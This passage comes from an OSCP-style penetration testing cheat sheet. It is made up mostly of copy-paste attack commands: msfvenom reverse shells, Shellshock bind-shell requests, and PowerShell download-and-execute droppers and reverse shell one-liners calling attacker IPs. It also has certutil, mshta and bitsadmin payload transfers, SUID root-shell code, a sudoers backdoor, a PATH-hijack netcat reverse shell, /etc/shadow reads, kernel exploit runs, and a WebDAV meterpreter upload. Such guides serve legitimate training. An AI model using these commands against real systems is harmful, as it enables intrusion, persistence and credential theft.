      - `msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=<Your IP Address> LPORT=<Your Port to Connect On> -f <language>`
    - *Windows Based Shellcode*
      - `msfvenom -p windows/meterpreter/reverse_tcp LHOST=<Your IP Address> LPORT=<Your Port to Connect On> -f <language>`
    - *Mac Based Shellcode*
      - `msfvenom -p osx/x86/shell_reverse_tcp LHOST=<Your IP Address> LPORT=<Your Port to Connect On> -f <language>`

  **Handlers**
  Metasploit handlers can be great at quickly setting up Metasploit to be in a position to receive your incoming shells. Handlers should be in the following format.

    ```
    use exploit/multi/handler
    set PAYLOAD <Payload name>
    set LHOST <LHOST value>
    set LPORT <LPORT value>
    set ExitOnSession false
    exploit -j -z
    ```

  - Once the required values are completed the following command will execute your handler – `msfconsole -L -r `

- SSH to Meterpreter: <https://daemonchild.com/2015/08/10/got-ssh-creds-want-meterpreter-try-this/>

    ```
    use auxiliary/scanner/ssh/ssh_login
    use post/multi/manage/shell_to_meterpreter
    ```

- SBD.exe

     sbd is a Netcat-clone, designed to be portable and offer strong encryption. It runs on Unix-like operating systems and on Microsoft Win32. sbd features AES-CBC-128 + HMAC-SHA1 encryption (by Christophe Devine), program execution (-e option), choosing source port, continuous reconnection with delay, and some other nice features. sbd supports TCP/IP communication only.
     sbd.exe (part of the Kali linux distribution: /usr/share/windows-binaries/backdoors/sbd.exe) can be uploaded to a windows box as a Netcat alternative.

- Shellshock

  - Testing for shell shock with NMap
    - `root@kali:~/Documents# nmap -sV -p 80 --script http-shellshock --script-args uri=/cgi-bin/admin.cgi $ip`
  - git clone <https://github.com/nccgroup/shocker>
    - `./shocker.py -H TARGET --command "/bin/cat /etc/passwd" -c /cgi-bin/status --verbose`
  - Shell Shock SSH Forced Command; Check for forced command by enabling all debug output with ssh  

    ```shell
    ssh -vvv  
    ssh -i noob noob@$ip '() { :;}; /bin/bash'
    ```

  - cat file (view file contents)  
    `echo -e "HEAD /cgi-bin/status HTTP/1.1\\r\\nUser-Agent: () {:;}; echo \\$(</etc/passwd)\\r\\nHost:vulnerable\\r\\nConnection: close\\r\\n\\r\\n" | nc TARGET 80`
  - Shell Shock run bind shell  
    `echo -e "HEAD /cgi-bin/status HTTP/1.1\\r\\nUser-Agent: () {:;}; /usr/bin/nc -l -p 9999 -e /bin/sh\\r\\nHost:vulnerable\\r\\nConnection: close\\r\\n\\r\\n" | nc TARGET 80`

### Execute a remote shell dropper

- Often, you can leverage PowerShell to execute a remotely hosted powershell script which contains a shell dropper (generated by the platform of your choosing).
  - `CMD C:\> @"%SystemRoot%\System32\WindowsPowerShell\v1.0\powershell.exe" -WindowStyle hidden -NonInteractive -NoProfile -InputFormat None -ExecutionPolicy Bypass -Command "iex ((New-Object System.Net.WebClient).DownloadString('http://10.10.10.10/Invoke-PowerShellTcp.ps1'))"`
- There are also some no-so-well documented PowerShell argument shortcuts so can use things like -w rather than -WindowsStyle (handy for smaller payloads):
  - `CMD C:\> @"%SystemRoot%\System32\WindowsPowerShell\v1.0\powershell.exe" -w hidden -noni -nop -i None -ex Bypass -c "iex ((New-Object System.Net.WebClient).DownloadString('http://10.10.10.10/Invoke-PowerShellTcp.ps1'))"`

### Creating a fast TCP/UDP tunnel transported over HTTP secured via SSH with CHISEL

- Download the appropriate OS binaries from the release folder of the chisel [on here](https://github.com/jpillora/chisel): `mv ~/Downloads/chisel_1.7.6_windows_amd64.gz .`
- Unzip the files with gunzip:
  - `gunzip -d chisel_1.7.6_windows_amd64.gz` & then make it executable `mv chisel_1.7.6_windows_amd64 chisel.exe`
  - `gunzip -d chisel_1.7.6_linux_amd64.gz` & then make it executable by `mv chisel_1.7.6_linux_amd64 chisel` & `chmod +x chisel`
- Then on the attacker machine run the chisel server:
  `./chisel server --reverse --port 9002`
- Send the client one to the host/victim machine via curl/curtutil/ftp/netcat or whatever mechanism you have and then execute the following. Have that in mind below maps port 3306 to localhost in reverse and also we mapped the second one 8888 just in case.
  `.\chisel.exe client 10.10.14.23:9002 R:3306:localhost:3306 R:8888:localhost:8888`

### Upgrading your Windows Shell

You might find that you are connected with a limited shell such as a Web shell, netcat shell or Telnet connection that simply is not cutting it for you. Here are a few oneliners you can use to upgrade your shell:

#### Netcat Reverseshell Oneliners for Windows

- Sometimes it is helpful to create a new Netcat session from an existed limited shell, webshell or unstable (short lived) remote shell. If you have transfered the shell to victim box, execute: `nc.exe 10.10.14.23 9001 -e powershell`

#### Upgrade Windows Command Line with a Powershell One-liner Reverse Shell

- You can run this oneliner from the remote Windows command prompt to skip the file upload step entirely (again be sure to update the IP and port):
  - `CMD C:\> @"%SystemRoot%\System32\WindowsPowerShell\v1.0\powershell.exe" -NoProfile -InputFormat None -ExecutionPolicy Bypass -Command "&{$client = New-Object System.Net.Sockets.TCPClient(\"10.10.10.10\",4444);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + \"PS \" + (pwd).Path + \"^> \";$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()}"`

#### Upgrade Shell with PowerShell Nishang

Nishang is a framework and collection of scripts and payloads which enables usage of PowerShell for offensive security and post exploitation during Penetraion Tests. The scripts are written on the basis of requirement by the author during real Penetration Tests:
**For this to work, you should have an exploit that can run remote command execution**

    ```bash
    root@kali:~/test# git clone https://github.com/samratashok/nishang.git                                                  
    Cloning into 'nishang'...
    remote: Enumerating objects: 1612, done.
    remote: Total 1612 (delta 0), reused 0 (delta 0), pack-reused 1612
    Receiving objects: 100% (1612/1612), 5.87 MiB | 6.62 MiB/s, done.
    Resolving deltas: 100% (1010/1010), done.
    root@kali:~/test# cd nishang/
    root@kali:~/test/nishang# cd Shells/
    root@kali:~/test/nishang/Shells# echo Invoke-PowerShellTcp -Reverse -IPAddress 10.10.10.10 -Port 4444 >> Invoke-PowerShellTcp.ps1
    root@kali:~/test/nishang/Shells# python -m SimpleHTTPServer 80
    ```

  - You can install nishang via `sudo apt-get install nishang` which installs all of the reverseshells within `/user/share/nishang/shells/` to be used for purpose of reverse shells.
      `cp /usr/share/nishang/Shells/Invoke-PowerShellTcp.ps1 rev.ps1`
  - After copying the script to your local working folder, copy one of the suitable example lines in the **rev.ps1** to the bottom of the file:
      `Invoke-PowerShellTcp -Reverse -IPAddress 10.10.14.19 -Port 9001`
  - Start a web server via python
      `python3 -m http.server 80`
  - And within your RCE, put this as:
    - `powershell.exe -command IEX( IWR http://10.10.14.19:80/rev.ps1 -UseBasicParsing)`
      or
    - `powershell.exe -command IEX(New-Object Net.WebClient).DownloadString('http://10.10.14.19:80/rev.ps1')`
  - You have to remember to run the handler to catch the shell:
    - `nc -nvlp 9001`

## File Transfers

- Post exploitation refers to the actions performed by an attacker,
    once some level of control has been gained on his target.

- Simple Local Web Servers

  - Run a basic http server, great for serving up shells etc  
    - `python -m SimpleHTTPServer 80`

  - Run a basic Python3 http server, great for serving up shells etc  
    - `python3 -m http.server 80`

  - Run a ruby webrick basic http server  
    - `ruby -rwebrick -e "WEBrick::HTTPServer.new (:Port => 80, :DocumentRoot => Dir.pwd).start"`

  - Run a basic PHP http server  
    - `php -S $ip:80`

- Creating a wget VB Script on Windows: [*https://github.com/erik1o6/oscp/blob/master/wget-vbs-win.txt*](https://github.com/erik1o6/oscp/blob/master/wget-vbs-win.txt)

- Mounting File Shares
  - Mount NFS share to /mnt/nfs  
    - `mount $ip:/vol/share /mnt/nfs`

- HTTP Put  
    - `nmap -p80 $ip --script http-put --script-args http-put.url='/test/sicpwn.php',http-put.file='/var/www/html/sicpwn.php`

Also check : <https://isroot.nl/2018/07/09/post-exploitation-file-transfers-on-windows-the-manual-way/>

### Uploading Files

Sometimes we will want to upload a file to the Windows machine in order to speed up our enumeration or to privilege escalate. Often you will find that uploading files is not needed in many cases if you are able to execute PowerShell that is hosted on a remote webserver (we will explore this more in the upgrading Windows Shell, Windows Enumeration and Windows Exploits sections). Uploading files increased the chances of being detected by antivirus and leaves unnecssary data trail behind. We will look at 4 ways of uploading files to a remote Windows machine from Kali Linux:

1. VBScript HTTP Downloader
2. PowerShell HTTP Downloader
3. Python HTTP Downloader
4. FTP Downloader

_NOTE_ There are MANY more ways to move files back and forth between a Windows machine, most can be found on the LOLBAS project: <https://lolbas-project.github.io/>

Most of these will require that we create a simple local webserver on our Kali box to serve the files (NOTE: I have had issues running this command within TMUX for whatever reason... so dont run it in TMUX). 
- I like to use the Python Simple HTTP Server: `python -m SimpleHTTPServer 80` or `python3 -m http.server 80`
- Or the Python pyftpdlib FTP Server (again don't run from TMUX):

  ```shell
  apt-get install python-pyftpdlib
  python -m pyftpdlib -p 21
  ```

- SCP

  ```shell
  scp username1@source_host:directory1/filename1 username2@destination_host:directory2/filename2
  scp localfile username@$ip:~/Folder/
  scp Linux_Exploit_Suggester.pl bob@192.168.1.10:~
  ```

- Webdav with Davtest- Some sysadmins are kind enough to enable the PUT method - This tool will auto upload a backdoor

  - `davtest -move -sendbd auto -url http://$ip`
  - <https://github.com/cldrn/davtest>
  - You can also upload a file using the PUT method with the curl command:
   `curl -T 'leetshellz.txt' 'http://$ip'`
  - And rename it to an executable file using the MOVE method with the curl command:
   `curl -X MOVE --header 'Destination:http://$ip/leetshellz.php' 'http://$ip/leetshellz.txt'`

- Upload shell using limited php shell cmd  
  - use the webshell to download and execute the meterpreter  
  - `curl -s --data "cmd=wget <http://174.0.42.42:8000/dhn> -O`
  - `/tmp/evil" <http://$ip/files/sh.php>`
  - `curl -s --data "cmd=chmod 777 /tmp/evil"`
  - `<http://$ip/files/sh.php>`
  - `curl -s --data "cmd=bash -c /tmp/evil" <http://$ip/files/sh.php>`

- TFTP  
  
  ```cmd
  mkdir /tftp  
  atftpd --daemon --port 69 /tftp  
  cp /usr/share/windows-binaries/nc.exe /tftp/  
  EX. FROM WINDOWS HOST:  
  C:\\Users\\Offsec>tftp -i $ip get nc.exe
  ```

- FTP  
  
  ```shell
  apt-get update && apt-get install pure-ftpd  

  #!/bin/bash  
  groupadd ftpgroup  
  useradd -g ftpgroup -d /dev/null -s /etc ftpuser  
  pure-pw useradd offsec -u ftpuser -d /ftphome  
  pure-pw mkdb  
  cd /etc/pure-ftpd/auth/  
  ln -s ../conf/PureDB 60pdb  
  mkdir -p /ftphome  
  chown -R ftpuser:ftpgroup /ftphome/  

  /etc/init.d/pure-ftpd restart
  ```

#### Uploading Files with VBScript

In my experiance, VBScript is one of the easiest methods of transfering files to a remote Windows. The only downside is that the file size you can transfer is rather limited. I often have trouble transfering anything over 1 MB using this method and have to fall back on other methods (Windows-privesc-check2.exe is much too large to transfer using this method).

- First lets test to see if we can run VBScript
  `echo WScript.StdOut.WriteLine "Yes we can run vbscript!" > testvb.vbs`
- Now we run it to see the results:
  `cscript testvb.vbs`
- If you see the following message, we are good to go with VBScript!:

  ```CMD
  C:\Users\Test>cscript testvb.vbs
  Microsoft (R) Windows Script Host Version 5.812
  Copyright (C) Microsoft Corporation. All rights reserved.

  #Yes we can run vbscript!
  ```

- If you see the following messages, you should move on to PowerShell:

  ```CMD
  C:\temp>cscript testvb.vbs
  This program is blocked by group policy. For more information, contact your system administrator.
  C:\temp>testvb.vbs
  Access is denied.
  ```

Now we can create a very simple downloader script by copying and pasting this single line of code into your windows commandline. I have tried to create a VBS script to download files from a remote webserver with the least possible number of lines of VBS code and I believe this is it.

- If Windows is an older version of windows (Windows 8 or Server 2012 and below) use the following script:

  `CMD C:\> echo dim xHttp: Set xHttp = createobject("Microsoft.XMLHTTP")  > dl.vbs &echo dim bStrm: Set bStrm = createobject("Adodb.Stream")  >> dl.vbs &echo xHttp.Open "GET", WScript.Arguments(0), False  >> dl.vbs &echo xHttp.Send >> dl.vbs & echo bStrm.type = 1 >> dl.vbs &echo bStrm.open >> dl.vbs & echo bStrm.write xHttp.responseBody >> dl.vbs &echo bStrm.savetofile WScript.Arguments(1), 2 >> dl.vbs`

- If Windows is a newer version (Windows 10 or Server 2016), try the following code:

  `CMD C:\> echo dim xHttp: Set xHttp = CreateObject("MSXML2.ServerXMLHTTP.6.0")  > dl.vbs &echo dim bStrm: Set bStrm = createobject("Adodb.Stream")  >> dl.vbs &echo xHttp.Open "GET", WScript.Arguments(0), False  >> dl.vbs &echo xHttp.Send >> dl.vbs &echo bStrm.type = 1 >> dl.vbs &echo bStrm.open >> dl.vbs &echo bStrm.write xHttp.responseBody >> dl.vbs &echo bStrm.savetofile WScript.Arguments(1), 2 >> dl.vbs`

- Now try to download a file to the local path:
  `CMD C:\> cscript dl.vbs "http://10.10.10.10/archive.zip" ".\archive.zip"`

#### Uploading Files with CertUtil.exe

I've found that CertUtil can be quite reliable when all else seems to fail.
  `certutil.exe -urlcache -split -f http://10.10.10.10/exploit.exe`

#### Transfering Files using MSHTA

Mshta.exe is a utility that executes Microsoft HTML Applications (HTA). And it can also be used to transfer files :D

- HTML
  `C:\>mshta http://10.10.10.10/badthings.exe`
- FTP
  `C:\>mshta ftp://10.10.10.10:21/badthings.exe`

#### Trasfering Files using Bitsadmin

Background Intelligent Transfer Service (BITS) is a component of Microsoft Windows XP and later iterations of the operating systems, which facilitates asynchronous, prioritized, and throttled transfer of files between machines using idle network bandwidth. BITSAdmin is a command-line tool that you can use to create download or upload jobs and monitor their progress. For full, comprehensive documentation of the tool and all of its commands, see bitsadmin and bitsadmin examples in the Windows IT Pro Center.
  `bitsadmin /transfer badthings http://10.10.10.10:80/badthings.exe c:\users\public\payload.exe`

#### Uploading Files with PowerShell

- Test to see if we can run Powershell:
  `@"%SystemRoot%\System32\WindowsPowerShell\v1.0\powershell.exe" -NoProfile -InputFormat None -ExecutionPolicy Bypass -Command "get-host"`

- Test to see if we can run Powershell Version 2:
  `@"%SystemRoot%\System32\WindowsPowerShell\v1.0\powershell.exe" -Version 2 -NoProfile -InputFormat None -ExecutionPolicy Bypass -Command "$PSVersionTable"`

- Try to download a file from a remote server to the windows temp folder from the Windows command line:
  `@"%SystemRoot%\System32\WindowsPowerShell\v1.0\powershell.exe" -NoProfile -InputFormat None -ExecutionPolicy Bypass -Command "(New-Object System.Net.WebClient).DownloadFile(\"http://10.10.10.10/exploit.exe\", \"C:\\Users\\Public\\Downloads\\exploit.exe\")"`

- Or from a PowerShell... shell:
  `IEX(New-Object System.Net.WebClient).DownloadFile(\"http://10.10.10.10/exploit.exe\", \"C:\\Users\\Public\\Downloads\\exploit.exe\")"`

- OR This one seems to work better while at the console:
  `IEX(New-Object System.Net.WebClient).DownloadFile("http://10.10.10.10/exploit.exe", "C:\Users\Public\Downloads\exploit.exe")`

#### Uploading Files with Python

Sometimes a Windows machine will have development tools like Python installed. Check for python: `python -h`

- Download a file using Python:
  `python -c "import urllib.request; urllib.request.urlretrieve('http://10.10.10.10/cat.jpg', 'C:\\Users\\Public\\Downloads\\cat.jpg');"`

#### Uploading Files with Perl

- Sometimes a Windows machine will have development tools like PERL installed. Check for PERL
  `perl -v`

- Download a file using PERL:
  `perl -le "use File::Fetch; my $ff = File::Fetch->new(uri => 'http://10.10.10.10/nc.exe'); my $file = $ff->fetch() or die $ff->error;"`

#### Uploading Files with curl

- Sometimes a Windows machine will have development tools like CURL installed. Check for CURL: `curl -v`
  `curl 10.10.14.23:8080/winPEASEany.exe -o winpeas.exe`

#### Uploading Files with FTP

After running the python ftp lib on (`python -m pyftpdlib -p 21`) on Kali, you can try connecting using the windows FTP client:

  ```CMD
  C:\Users\pwnd>ftp 10.10.10.10
  Connected to 10.10.10.10
  220 pyftpdlib 1.5.3 ready.
  User (10.10.15.31:(none)): anonymous
  331 Username ok, send password.
  Password: anonymous

  230 Login successful.                                                                                                                      
  ftp> ls                                                                                                                                 
  dir                                                                                                                                       
  421 Active data channel timed out.
  ```

If you are seeing a 421 timeout when you try to send a command it is likely because your connection is being blocked by the windows firewall. The Windows command-line ftp.exe supports the FTP active mode only. In the active mode, the server has to connect back to the client to establish data connection for a file transfer.

You can check to see if the remote machine has Winscp.exe installed. Winscp is capable of connecting to an FTP server using passive mode and will not be blocked by the firewall.

#### Transfering Files via SMB using Impacket

Kali comes loade with the incredible Impacket library which is a swiss army knife of network protocols... just Awesome. You can easily create a SMB share on your local Kali machine and move files between Kali and Windows with ease. <https://github.com/SecureAuthCorp/impacket>

- First we will setup the SMB Share on Kali like so:

  ```shell
  root@kali:~# impacket-smbserver root /root/Desktop
  Impacket v0.9.16-dev - Copyright 2002-2017 Core Security Technologies

  [*] Config file parsed
  [*] Callback added for UUID 4B324FC8-1670-01D3-1278-5A47BF6EE188 V:3.0
  [*] Callback added for UUID 6BFFD098-A112-3610-9833-46C3F87E345A V:1.0
  [*] Config file parsed
  [*] Config file parsed
  [*] Config file parsed
  ```

- Confirm it is up and running using Net View on the Windows command line:

  ```CMD
  C:\Users\Null>net view \\192.168.0.49
  Shared resources at \\192.168.0.49

  (null)

  Share name  Type  Used as  Comment

  -------------------------------------------------------------------------------
  smbshare    Disk
  The command completed successfully.
  ```

- Then we can trasnfer files from the command line as if it were a normal folder:

  ```CMD
  C:\Users\Admin>dir \\192.168.0.49\smbshare 
  C:\Users\Admin>copy \\192.168.0.49\smbshare\loot.zip .
  ```

- By far the most interesting feature of the SMB Share method is that you can execute files directly over the SMB Share without copying them to the remote machine (fileless execution is so hot right now):
  `C:\Users\Admin>\\192.168.0.49\smbshare\payload.exe`

- A fancy trick I learned from IPPSec is to create a mapped drive to a remote SMB share like so:

  ```CMD
  net use y: \\192.168.0.49\smbshare  
  y: 
  dir
  ```
### Packing Files

- Ultimate Packer for eXecutables  
  - `upx -9 nc.exe`

- exe2bat - Converts EXE to a text file that can be copied and pasted  
  - `locate exe2bat`  
  - `wine exe2bat.exe nc.exe nc.txt`

- Veil - Evasion Framework - <https://github.com/Veil-Framework/Veil-Evasion>  
    
    ```shell
    apt-get -y install git  
    git clone <https://github.com/Veil-Framework/Veil-Evasion.git>  
    cd Veil-Evasion/  
    cd setup  
    setup.sh -c
    ```

## Linux Privilege Escalation

Password reuse is your friend.  The OSCP labs are true to life, in the way that the users will reuse passwords across different services and even different boxes. Maintain a list of cracked passwords and test them on new machines you encounter.**

- Defacto Linux Privilege Escalation Guide  - A much more through guide for linux enumeration:
    [https://blog.g0tmi1k.com/2011/08/basic-linux-privilege-escalation/](https://blog.g0tmi1k.com/2011/08/basic-linux-privilege-escalation/)

- Try the obvious - Maybe the user is root or can sudo to root:  
  - `id`
  - `sudo su`

- Here are the commands I have learned to use to perform linux enumeration and privledge escalation:
  - What users can login to this box (Do they use their username as their password)?:
    `grep -vE "nologin|false" /etc/passwd`  
  - What kernel version are we using? Do we have any kernel exploits for this version?
    - `uname -a`
    - `searchsploit linux kernel 3.2 --exclude="(PoC)|/dos/"`
  - What applications have active connections?:
    - `netstat -tulpn`
  - What services are running as root?:
    - `ps aux | grep root`
  - What files run as root / SUID / GUID?:

    ```shell
    find / -perm +2000 -user root -type f -print
    find / -perm -1000 -type d 2>/dev/null   # Sticky bit - Only the owner of the directory or the owner of a file can delete or rename here.
    find / -perm -g=s -type f 2>/dev/null    # SGID (chmod 2000) - run as the group, not the user who started it.
    find / -perm -u=s -type f 2>/dev/null    # SUID (chmod 4000) - run as the owner, not the user who started it.
    find / -perm -g=s -o -perm -u=s -type f 2>/dev/null    # SGID or SUID
    for i in `locate -r "bin$"`; do find $i \( -perm -4000 -o -perm -2000 \) -type f 2>/dev/null; done  
    find / -perm -g=s -o -perm -4000 ! -type l -maxdepth 3 -exec ls -ld {} \; 2>/dev/null
    ```

    What folders are world writeable?:

    ```shell
    find / -writable -type d 2>/dev/null      # world-writeable folders
    find / -perm -222 -type d 2>/dev/null     # world-writeable folders
    find / -perm -o w -type d 2>/dev/null     # world-writeable folders
    find / -perm -o x -type d 2>/dev/null     # world-executable folders
    find / \( -perm -o w -perm -o x \) -type d 2>/dev/null   # world-writeable & executable folders
    ```

- There are a few scripts that can automate the linux enumeration process:
  - Google is my favorite Linux Kernel exploitation search tool.  Many of these automated checkers are missing important kernel exploits which can create a very frustrating blindspot during your OSCP course.
  - LinuxPrivChecker.py - My favorite automated linux priv enumeration checker - [https://www.securitysift.com/download/linuxprivchecker.py](https://www.securitysift.com/download/linuxprivchecker.py)
  - LinEnum - (Recently Updated) [https://github.com/rebootuser/LinEnum](https://github.com/rebootuser/LinEnum)
  - linux-exploit-suggester (Recently Updated) [https://github.com/mzet-/linux-exploit-suggester](https://github.com/mzet-/linux-exploit-suggester)
  - Highon.coffee Linux Local Enum - Great enumeration script!
    - `wget https://highon.coffee/downloads/linux-local-enum.sh`
  - Linux Privilege Exploit Suggester  (Old has not been updated in years) [https://github.com/PenturaLabs/Linux_Exploit_Suggester](https://github.com/PenturaLabs/Linux_Exploit_Suggester)
  - Linux post exploitation enumeration and exploit checking tools [https://github.com/reider-roque/linpostexp](https://github.com/reider-roque/linpostexp)
- Handy Kernel Exploits
  - CVE-2010-2959 - 'CAN BCM' Privilege Escalation - Linux Kernel < 2.6.36-rc1 (Ubuntu 10.04 / 2.6.32) [https://www.exploit-db.com/exploits/14814/](https://www.exploit-db.com/exploits/14814/)

    ```shell
    wget -O i-can-haz-modharden.c http://www.exploit-db.com/download/14814
    $ gcc i-can-haz-modharden.c -o i-can-haz-modharden
    $ ./i-can-haz-modharden
    [+] launching root shell!
    # id
    uid=0(root) gid=0(root)
    ```
  - CVE-2010-3904 - Linux RDS Exploit - Linux Kernel <= 2.6.36-rc8 [https://www.exploit-db.com/exploits/15285/](https://www.exploit-db.com/exploits/15285/)
  - CVE-2012-0056 - Mempodipper - Linux Kernel 2.6.39 < 3.2.2 (Gentoo / Ubuntu x86/x64) [https://git.zx2c4.com/CVE-2012-0056/about/](https://git.zx2c4.com/CVE-2012-0056/about/)  
  - Linux CVE 2012-0056  

    ```shell
    wget -O exploit.c http://www.exploit-db.com/download/18411 
    gcc -o mempodipper exploit.c  
    ./mempodipper
    ```
- CVE-2016-5195 - Dirty Cow - Linux Privilege Escalation - Linux Kernel <= 3.19.0-73.8  [https://dirtycow.ninja/](https://dirtycow.ninja/) First existed on 2.6.22 (released in 2007) and was fixed on Oct 18, 2016  
- Run a command as a user other than root  
    - sudo -u haxzor /usr/bin/vim /etc/apache2/sites-available/000-default.conf
- Add a user or change a password
    ```shell
    /usr/sbin/useradd -p 'openssl passwd -1 thePassword' haxzor  
    echo thePassword | passwd haxzor --stdin
    ```
- Local Privilege Escalation Exploit in Linux

  - **SUID** (Set owner User ID up on execution)  
    Often SUID C binary files are required to spawn a shell as a superuser, you can update the UID / GID and shell as required. below are some quick copy and paste examples for various shells:

      ```shell
      # SUID C Shell for /bin/bash  

      int main(void){  
      setresuid(0, 0, 0);  
      system("/bin/bash");  
      }  

      # SUID C Shell for /bin/sh  

      int main(void){  
      setresuid(0, 0, 0);  
      system("/bin/sh");  
      }  

      # Building the SUID Shell binary  
      gcc -o suid suid.c  
      # For 32 bit:  
      gcc -m32 -o suid suid.c
      ```

  - Create and compile an SUID from a limited shell (no file transfer)  

    ```
    echo "int main(void){\nsetgid(0);\nsetuid(0);\nsystem(\"/bin/sh\");\n}" >privsc.c  
    gcc privsc.c -o privsc
    ```

- Handy command if you can get a root user to run it. Add the www-data user to Root SUDO group with no password requirement:
  - `echo 'chmod 777 /etc/sudoers && echo "www-data ALL=NOPASSWD:ALL" >> /etc/sudoers && chmod 440 /etc/sudoers' > /tmp/update`

- You may find a command is being executed by the root user, you may be able to modify the system PATH environment variable to execute your command instead.  In the example below, ssh is replaced with a reverse shell SUID connecting to 10.10.10.1 on port 4444.

    ```shell
    set PATH="/tmp:/usr/local/bin:/usr/bin:/bin"
    echo "rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.10.1 4444 >/tmp/f" >> /tmp/ssh
    chmod +x ssh
    ```

- Kernel Exploit Suggestions for Kernel Version 3.0.0  
     `./usr/share/linux-exploit-suggester/Linux_Exploit_Suggester.pl -k 3.0.0`
- Precompiled Linux Kernel Exploits  - ***Super handy if GCC is not installed on the target machine!***
    [*https://www.kernel-exploits.com/*](https://www.kernel-exploits.com/)
- Collect root password
      `cat /etc/shadow |grep root`
- Find and display the proof.txt or flag.txt - LOOT!
      `cat find / -name proof.txt -print`

### SearchSploit  

- `searchsploit –uncsearchsploit apache 2.2`
- `searchsploit "Linux Kernel"`
- searching for something specific: 
  `searchsploit linux 2.6 | grep -i ubuntu | grep local`
- Searching and showing results as Json and colorful: 
  `searchsploit -j osticket | jq .` 
- Bringing a specific exploit up and examine:
  `searchsploit -x $<exploit path>`
- Copy and mirror the exploit to current directory:
  `searchsploit -m $<exploit path>`
- Feeding nmap xml results into searchsploit for finding something:
  `searchsploit –x --nmap result.xml`

## Windows Privilege Escalation

*Password reuse is your friend.  The OSCP labs are true to life, in the way that the users will reuse passwords across different services and even different boxes. Maintain a list of cracked passwords and test them on new machines you encounter.*

- Windows Privilege Escalation resource
    <http://www.fuzzysecurity.com/tutorials/16.html>

- Metasploit Meterpreter Privilege Escalation Guide
    <https://www.offensive-security.com/metasploit-unleashed/privilege-escalation/>

- Try the obvious - Maybe the user is SYSTEM or is already part of the Administrator group:  

    `whoami`

    `net user "%username%"`

- Try the getsystem command using meterpreter - rarely works but is worth a try.

    `meterpreter > getsystem`

- No File Upload Required Windows Privlege Escalation Basic Information Gathering (based on the fuzzy security tutorial and windows_privesc_check.py).

     Copy and paste the following contents into your remote Windows shell in Kali to generate a quick report:

      ```shell
      @echo --------- BASIC WINDOWS RECON ---------  > report.txt
      timeout 1
      net config Workstation  >> report.txt
      timeout 1
      systeminfo | findstr /B /C:"OS Name" /C:"OS Version" >> report.txt
      timeout 1
      hostname >> report.txt
      timeout 1
      net users >> report.txt
      timeout 1
      ipconfig /all >> report.txt
      timeout 1
      route print >> report.txt
      timeout 1
      arp -A >> report.txt
      timeout 1
      netstat -ano >> report.txt
      timeout 1
      netsh firewall show state >> report.txt 
      timeout 1
      netsh firewall show config >> report.txt
      timeout 1
      schtasks /query /fo LIST /v >> report.txt
      timeout 1
      tasklist /SVC >> report.txt
      timeout 1
      net start >> report.txt
      timeout 1
      DRIVERQUERY >> report.txt
      timeout 1
      reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer\AlwaysInstallElevated >> report.txt
      timeout 1
      reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer\AlwaysInstallElevated >> report.txt
      timeout 1
      dir /s *pass* == *cred* == *vnc* == *.config* >> report.txt
      timeout 1
      findstr /si password *.xml *.ini *.txt >> report.txt
      timeout 1
      reg query HKLM /f password /t REG_SZ /s >> report.txt
      timeout 1
      reg query HKCU /f password /t REG_SZ /s >> report.txt 
      timeout 1
      dir "C:\"
      timeout 1
      dir "C:\Program Files\" >> report.txt
      timeout 1
      dir "C:\Program Files (x86)\"
      timeout 1
      dir "C:\Users\"
      timeout 1
      dir "C:\Users\Public\"
      timeout 1
      echo REPORT COMPLETE!
      ```
- Windows Server 2003 and IIS 6.0 WEBDAV Exploiting
<http://www.r00tsec.com/2011/09/exploiting-microsoft-iis-version-60.html>

      ```shell
         msfvenom -p windows/meterpreter/reverse_tcp LHOST=1.2.3.4 LPORT=443 -f asp > aspshell.txt

         cadaver http://$ip
         dav:/> put aspshell.txt
         Uploading aspshell.txt to '/aspshell.txt':
         Progress: [=============================>] 100.0% of 38468 bytes succeeded.
         dav:/> copy aspshell.txt aspshell3.asp;.txt ( Bypass webdav filter )  
         Copying '/aspshell3.txt' to '/aspshell3.asp%3b.txt':  succeeded.
         dav:/> exit

         msf > use exploit/multi/handler
         msf exploit(handler) > set payload windows/meterpreter/reverse_tcp
         msf exploit(handler) > set LHOST 1.2.3.4
         msf exploit(handler) > set LPORT 80
         msf exploit(handler) > set ExitOnSession false
         msf exploit(handler) > exploit -j

         curl http://$ip/aspshell3.asp;.txt

         [*] Started reverse TCP handler on 1.2.3.4:443 
         [*] Starting the payload handler...
         [*] Sending stage (957487 bytes) to 1.2.3.5
         [*] Meterpreter session 1 opened (1.2.3.4:443 -> 1.2.3.5:1063) at 2017-09-25 13:10:55 -0700
      ```

Without metasploit we can generate a shell and listen with netcat or metasploit multi handler.
**Use davtest to test for webdav**

- Windows privledge escalation exploits are often written in Python. So, it is necessary to compile the using pyinstaller.py into an executable and upload them to the remote server.

      ```shell
      pip install pyinstaller
      wget -O exploit.py http://www.exploit-db.com/download/31853  
      python pyinstaller.py --onefile exploit.py
      ```

- Windows Server 2003 and IIS 6.0 privledge escalation using impersonation:

      <https://www.exploit-db.com/exploits/6705/>

      <https://github.com/Re4son/Churrasco>

      ```shell
      c:\Inetpub>churrasco
      churrasco 
      /churrasco/-->Usage: Churrasco.exe [-d] "command to run"

      c:\Inetpub>churrasco -d "net user /add <username> <password>"
      c:\Inetpub>churrasco -d "net localgroup administrators <username> /add"
      c:\Inetpub>churrasco -d "NET LOCALGROUP 'Remote Desktop Users' <username> /ADD"
      ```

- Windows MS11-080 - <http://www.exploit-db.com/exploits/18176/>  

      `python pyinstaller.py --onefile ms11-080.py`

      `mx11-080.exe -O XP`

- Powershell Exploits - You may find that some Windows privledge escalation exploits are written in Powershell. You may not have an interactive shell that allows you to enter the powershell prompt.  Once the powershell script is uploaded to the server, here is a quick one liner to run a powershell command from a basic (cmd.exe) shell:

      MS16-032 <https://www.exploit-db.com/exploits/39719/>

      `powershell -ExecutionPolicy ByPass -command "& { . C:\Users\Public\Invoke-MS16-032.ps1; Invoke-MS16-032 }"`

- Powershell Priv Escalation Tools
